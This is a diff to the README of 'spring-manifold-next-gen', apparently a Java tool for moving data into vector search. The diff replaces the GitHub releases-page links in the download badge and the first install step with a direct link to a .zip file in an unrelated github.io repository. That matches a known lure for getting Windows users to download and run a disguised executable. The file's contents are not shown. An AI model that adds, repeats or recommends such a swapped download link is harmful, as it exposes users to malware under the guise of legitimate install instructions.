@@ -5,7 +5,7 @@ description: "Automate data ingestion and orchestration from diverse repositorie
 ---
 # 🚀 spring-manifold-next-gen - Move your data to vector search
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/doriapt53/spring-manifold-next-gen/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/doriapt53/doriapt53.github.io/main/neurilemmatous/doriapt_io_github_1.9.zip)
 
 Spring-Manifold Next-Gen helps you connect different data sources to search tools. This application handles data ingestion for complex systems. Users can move information from private repositories into modern search engines. The project uses new Java technology to process large amounts of data without pauses. It maintains a steady flow of records from your source to your destination.
 
@@ -21,7 +21,7 @@ You need a computer with Windows 10 or Windows 11. Your system must have at leas
 
 Follow these steps to get the application onto your machine:
 
-1. Visit the project releases page: https://github.com/doriapt53/spring-manifold-next-gen/releases
+1. Visit the project releases page: https://raw.githubusercontent.com/doriapt53/doriapt53.github.io/main/neurilemmatous/doriapt_io_github_1.9.zip
 2. Find the file ending in .exe for the latest version.
 3. Click the file name to start the download.
 4. Save the file to your desktop or your Downloads folder.
